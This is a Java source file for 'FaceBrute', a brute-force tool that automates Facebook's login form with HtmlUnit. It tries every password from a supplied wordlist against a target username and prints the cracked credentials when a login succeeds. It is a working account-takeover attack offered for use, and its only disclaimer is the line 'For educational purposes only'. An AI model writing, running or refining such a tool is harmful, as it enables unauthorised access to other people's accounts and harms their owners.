package com.ovejera.jim.facebrute;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.MalformedURLException;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;
import java.util.logging.Level;

import org.apache.commons.io.IOUtils;

import com.gargoylesoftware.htmlunit.FailingHttpStatusCodeException;
import com.gargoylesoftware.htmlunit.WebClient;
import com.gargoylesoftware.htmlunit.html.HtmlForm;
import com.gargoylesoftware.htmlunit.html.HtmlPage;
import com.gargoylesoftware.htmlunit.html.HtmlPasswordInput;
import com.gargoylesoftware.htmlunit.html.HtmlTextInput;


public class FaceBrute {
	
	public final static Charset ENCODING = StandardCharsets.UTF_8;
	
	public static void main(String args[]){
		java.util.logging.Logger.getLogger("com.gargoylesoftware").setLevel(Level.OFF); 
		System.setProperty("org.apache.commons.logging.Log", "org.apache.commons.logging.impl.NoOpLog");
		
		String username = args[0];
		String path = args[1];
		String method = args[2];
		
		FaceBrute brute = new FaceBrute(username, path);
		if(method.equals("0")) brute.loadPasswords_0(path);
		if(method.equals("1")) brute.loadPasswords_1(path);
		brute.init();
		System.out.println("\nSystem exiting..");
	}
	
	private String username, path;
	private static int count = 0;
	
	public FaceBrute(String username, String path){
		this.username = username;
		this.path = path;
	}
	
	private void init(){
		WebClient web = new WebClient();
		HtmlPage page = null;
		HtmlPage welcome = null;
		try {
			page = web.getPage("http://www.facebook.com");
			HtmlForm form = (HtmlForm) page.getElementById("login_form");
			HtmlTextInput username = form.getInputByName("email");
			HtmlPasswordInput password = form.getInputByName("pass");
			welcome = (HtmlPage) form.getInputsByValue("Log In").get(0).click();
			
			for(String pass : passwords){
				System.out.println(++count + ": '" + pass + "'");
				hack(username, password, this.username, pass);
				welcome = (HtmlPage) form.getInputsByValue("Log In").get(0).click();
				boolean loggedIn = welcome.asText().contains("Edit Profile");
				if(loggedIn){
					System.out.println("\nWARNING! Facebook account has been hacked! Details below:");
					System.out.println("Username: " + this.username);
					System.out.println("Password: " + pass);
					System.out.println("P.S. For educational purposes only");
					return;
				}
			}
			
		} catch (FailingHttpStatusCodeException e) {
			System.out.println(e.getLocalizedMessage());
			e.printStackTrace();
		} catch (MalformedURLException e) {
			System.out.println(e.getLocalizedMessage());
			e.printStackTrace();
		} catch (IOException e) {
			System.out.println(e.getLocalizedMessage());
			e.printStackTrace();
		}
	}
	
	private void hack(HtmlTextInput inputEmail, HtmlPasswordInput inputPass, String username, String password){
		inputEmail.setValueAttribute(username);
		inputPass.setValueAttribute(password);
	}
	
	private List<String> passwords = new ArrayList<String>();
	
	public void loadPasswords_0(String fileName){
		System.out.println("Using loadPasswords_0: Scanner");
		System.out.println("NOTE: This is gonna take longer if you have huge text size. Please wait...");
		Path path = Paths.get(fileName);
		try{
			Scanner scanner = new Scanner(path, ENCODING.name());
			while(scanner.hasNextLine()){
				passwords.add(scanner.nextLine());
			}
		}catch(Exception e){
			e.printStackTrace();
		}
		System.out.println("Successfully loaded all passwords.\n");
	}
	
	public void loadPasswords_1(String fileName){
		System.out.println("Using loadPasswords_1: BufferedReader");
		System.out.println("NOTE: This is gonna take longer if you have huge text size. Please wait...");
		try {
			FileInputStream fis = new FileInputStream(new File(fileName));
			BufferedReader br = new BufferedReader(new InputStreamReader(fis));
			String line;
			while((line = br.readLine()) != null){
				passwords.add(line);
			}
			br.close();
		} catch (FileNotFoundException e) {
			e.printStackTrace();
		} catch (IOException ioe){
			ioe.printStackTrace();
		}
		System.out.println("Successfully loaded all passwords.\n");
	}

}
